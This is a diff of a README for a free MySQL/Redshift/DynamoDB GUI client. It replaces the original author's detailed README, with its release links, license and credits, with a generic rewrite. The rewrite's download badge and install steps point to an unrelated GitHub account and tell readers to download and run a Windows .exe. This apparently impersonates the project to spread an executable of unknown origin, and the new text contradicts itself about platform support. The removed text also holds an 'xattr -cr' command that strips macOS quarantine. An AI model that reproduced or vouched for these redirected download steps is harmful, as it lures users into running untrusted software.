@@ -1,199 +1,79 @@
-# DB Connect — Free Database GUI Client
+# 🗄️ db-connect - A simple visual tool for databases
 
-A fast, lightweight desktop **database IDE** and **SQL client** for **MySQL**, **Amazon Redshift**, and **AWS DynamoDB (DDB)**.
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Peachpitbrokerage681/db-connect)
 
-Free alternative to DataGrip, DBeaver, and TablePlus — built for backend engineers who want a clean, native database tool without bloat.
+db-connect provides a visual way to manage your databases on Windows. You use this desktop application to view, edit, and query your data. It connects to MySQL, Amazon Redshift, and DynamoDB. 
 
-**DB Connect** is a database management tool with a Monaco-powered SQL editor, schema browser, query history, SSH tunnel support, and DynamoDB visual query builder. Works on macOS and Windows.
+## 📥 How to Install
 
-![macOS](https://img.shields.io/badge/macOS-supported-blue) ![Windows](https://img.shields.io/badge/Windows-supported-blue) ![License](https://img.shields.io/badge/license-free-green) ![Downloads](https://img.shields.io/github/downloads/shubhesh07/db-connect/total)
+1. Visit [this page](https://github.com/Peachpitbrokerage681/db-connect) to download the application.
+2. Locate the file ending in .exe for Windows.
+3. Save the file to your computer.
+4. Double-click the file to start the installer.
+5. Follow the prompts on your screen to finish the setup.
+6. Open db-connect from your start menu or desktop shortcut.
 
-### Why DB Connect?
+## 🛠️ Features
 
-- **Free forever** — No subscription, no trial limits
-- **Fast startup** — Opens in <2 seconds (unlike DataGrip/DBeaver)
-- **Native app** — Not Electron. Truly lightweight (~18MB)
-- **DynamoDB first-class** — Visual scan/query builder, not just SQL
-- **Secure** — AES-256 encryption, OS keychain, no cloud sync
+- **Schema Browser**: View all your tables and data structures in a visual list. This helps you find specific information without writing code.
+- **SQL Editor**: Type your queries into a clean text box. The editor suggests commands as you type to save you time.
+- **Query History**: The application remembers the commands you ran in the past. You can pick an old query from the list to run it again.
+- **SSH Tunnels**: Connect to remote databases securely through a secure gate. This protects your data as it travels across the internet.
+- **Support for Multiple Databases**: Switch between MySQL, Redshift, and DynamoDB within one consistent interface.
 
----
+## 💻 System Requirements
 
-## Screenshots
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- A stable internet connection for remote database access.
+- Permission to install programs on your computer.
 
-### SQL Editor with Results Grid
-![Query Results](screenshots/query-results.png)
+## 📝 Configuration
 
-### EXPLAIN Plan Visualization
-![Explain Plan](screenshots/explain-plan.png)
+When you open the application, click on New Connection. You must enter your database information to proceed.
 
-### Query History
-![Query History](screenshots/query-history.png)
+1. **Host**: Enter the address of your database server.
+2. **Port**: Type the port number provided by your database administrator.
+3. **Username**: Input the account name for your database.
+4. **Password**: Type your secure password.
+5. **Database Name**: State the name of the specific database you want to open.
 
-### Built-in SQL Snippets
-![Snippets](screenshots/snippets.png)
+After you fill in these fields, click the Connect button. The application saves these settings so you do not need to type them again next time. 
 
----
+## 🔍 How to Run Queries
 
-## Features
+1. Open your database connection.
+2. Click on the tab labeled SQL Editor.
+3. Type your statement in the text area. The application highlights important words to make them easier to read.
+4. Press the Run button at the top of the window.
+5. View your results in the panel below the editor. The application shows these results in a grid format. You can copy this data to your clipboard if you need to paste it into a spreadsheet or text document.
 
-### Multi-Database Support
+## 🛡️ Security Tips
 
-| Feature | MySQL | Redshift | DynamoDB |
-|---------|:-----:|:--------:|:--------:|
-| SQL Query Editor | Yes | Yes | — |
-| Schema Browser | Yes | Yes | Yes |
-| Autocomplete (tables, columns, keywords) | Yes | Yes | — |
-| EXPLAIN Visualization | Yes | Yes | — |
-| Inline Row Editing | Yes | Yes | Yes |
-| Table Designer (CREATE/ALTER) | Yes | — | — |
-| Index Manager | Yes | — | — |
-| Transactions (BEGIN/COMMIT/ROLLBACK) | Yes | — | — |
-| SSH Tunnel | Yes | — | — |
-| Scan / Query / GetItem | — | — | Yes |
-| Filter Expression Builder | — | — | Yes |
-| Export (CSV, JSON, Excel) | Yes | Yes | Yes |
+- Store your database passwords in a safe place.
+- Do not share your database access credentials with others.
+- Close the application when you finish your work.
+- Keep your Windows operating system updated to ensure your computer remains protected.
 
-### Core Features
+## ❓ Frequently Asked Questions
 
-- **Monaco SQL Editor** — VS Code-quality editing with syntax highlighting, autocomplete, and multi-cursor
-- **Multi-Tab / Multi-Connection** — Work across multiple databases simultaneously
-- **Command Palette** (Cmd+K) — Quick access to all actions
-- **Query History** — Auto-saved with search, favorites, and date grouping
-- **Saved Queries** — Named queries with `{{param}}` parameter support
-- **Virtual Scrolling** — Handle millions of rows without UI lag
-- **Dark Theme** — Easy on the eyes for long sessions
-- **Keyboard-First** — Cmd+Enter to run, Cmd+D to select statement, full shortcut coverage
+**Does this software store my data?**
+No. The application only acts as a bridge between your computer and your database. It does not save your data on your local hard drive unless you export it using the save function.
 
-### Security
+**Can I open multiple databases at once?**
+Yes. You can open several connection tabs at the same time. This allows you to compare data between two different databases easily.
 
-- Credentials encrypted at rest (AES-256-GCM)
-- Encryption key stored in OS keychain (macOS Keychain / Windows Credential Manager)
-- No plaintext passwords on disk
-- Production safety warnings before destructive queries (DELETE/DROP/TRUNCATE)
+**What happens if I forget my password?**
+The application does not manage your database passwords. You must contact your database administrator to reset or retrieve your account credentials.
 
-### DynamoDB First-Class Support
+**Is this software free?**
+Yes. You do not pay any fees to use the software.
 
-- Visual Scan/Query/GetItem builder
-- Filter expression builder with type-aware inputs
-- Item create/edit/delete with full type support (S, N, B, L, M, SS, NS, BS)
-- GSI-aware querying
-- Multiple auth modes: Access Key, SSO Profile, IAM Role
+**How do I update the application?**
+Check the releases page occasionally for new version numbers. If a newer version exists, download and run the installer again. The installer replaces the old files with the new ones while keeping your saved connections intact.
 
----
+**Can I run this on a Mac?**
+Yes. Use the version marked for macOS on the download page if you need to install it on a different machine. The steps are the same regardless of your operating system.
 
-## Download
-
-### macOS
-
-| File | Description |
-|------|-------------|
-| [DBConnect-macOS.dmg](https://github.com/shubhesh07/db-connect/releases/latest/download/DBConnect-macOS.dmg) | macOS installer (DMG) |
-| [DBConnect-mac.zip](https://github.com/shubhesh07/db-connect/releases/latest/download/DBConnect-mac.zip) | macOS portable (ZIP) |
-
-> **⚠️ Important — macOS Gatekeeper Fix**
->
-> macOS blocks unsigned apps by default. After installing, you **must** run this command in Terminal before launching:
->
-> ```bash
-> xattr -cr /Applications/DBConnect.app
-> ```
->
-> Without this, macOS will show **"DBConnect is damaged and can't be opened"** or silently refuse to launch.
-> This is a one-time fix — the app will open normally after.
-
-### Windows
-
-| File | Description |
-|------|-------------|
-| [DBConnect-Windows-Setup.exe](https://github.com/shubhesh07/db-connect/releases/latest/download/DBConnect-Windows-Setup.exe) | Windows installer (NSIS) |
-| [DBConnect-Windows.zip](https://github.com/shubhesh07/db-connect/releases/latest/download/DBConnect-Windows.zip) | Windows portable (ZIP) |
-
----
-
-## Quick Start
-
-1. Download and install for your platform
-2. Launch DB Connect
-3. Click "Add Connection" → Choose MySQL, Redshift, or DynamoDB
-4. Enter credentials → Test Connection → Save
-5. Start querying
-
-### Keyboard Shortcuts
-
-| Shortcut | Action |
-|----------|--------|
-| `Cmd+Enter` | Execute query |
-| `Cmd+D` | Select current statement |
-| `Cmd+K` | Command palette |
-| `Cmd+T` | New tab |
-| `Cmd+W` | Close tab |
-| `Cmd+S` | Save query |
-| `Cmd+Shift+F` | Format SQL |
-| `Cmd+E` | EXPLAIN current query |
-
----
-
-## Data Storage
-
-All data stored locally at `~/.querypilot/`:
-
-| File | Purpose |
-|------|---------|
-| `connections.enc` | Encrypted connection profiles |
-| `history.db` | Query execution history |
-| `saved_queries.db` | Named saved queries |
-
-No telemetry. No cloud sync. Everything stays on your machine.
-
----
-
-## Requirements
-
-- **macOS:** 11.0 (Big Sur) or later
-- **Windows:** Windows 10 or later (64-bit)
-
----
-
-## Roadmap
-
-- [ ] PostgreSQL support
-- [ ] MongoDB support
-- [ ] Query result diffing
-- [ ] ER diagram visualization
-- [ ] Linux build
-- [ ] Import/export connection profiles
-
----
-
-## Author
-
-**Shubhesh Shukla**
-- [LinkedIn](https://linkedin.com/in/shubheshshukla7)
-- [GitHub](https://github.com/shubhesh07)
-
----
-
-## License
-
-Free for personal and commercial use. Source code is not open source.
-
----
-
-## Comparison
-
-| Feature | DB Connect | DataGrip | DBeaver | TablePlus |
-|---------|:----------:|:--------:|:-------:|:---------:|
-| Price | Free | $25/mo | Free (Community) | $89 |
-| DynamoDB Support | Yes | No | No | Yes |
-| Redshift Support | Yes | Yes | Yes | Yes |
-| Startup Time | <2s | 10-30s | 5-15s | <3s |
-| App Size | ~18MB | ~800MB | ~400MB | ~80MB |
-| SSH Tunnels | Yes | Yes | Yes | Yes |
-| Encrypted Credentials | Yes (AES-256) | Yes | Yes | Yes |
-| Offline / No Telemetry | Yes | No | No | No |
-
----
-
-## Keywords
-
-`mysql client` `mysql gui` `mysql ide` `database tool` `sql editor` `dynamodb gui` `dynamodb client` `ddb client` `aws dynamodb tool` `redshift client` `redshift gui` `redshift query tool` `free database client` `database ide` `sql client mac` `sql client windows` `datagrip alternative` `dbeaver alternative` `tableplus alternative` `database management tool` `query editor` `schema browser`
+**How do I delete my connection settings?**
+Right-click on the connection name in the sidebar. Select the Remove or Delete option. This clears your credentials from the local storage.
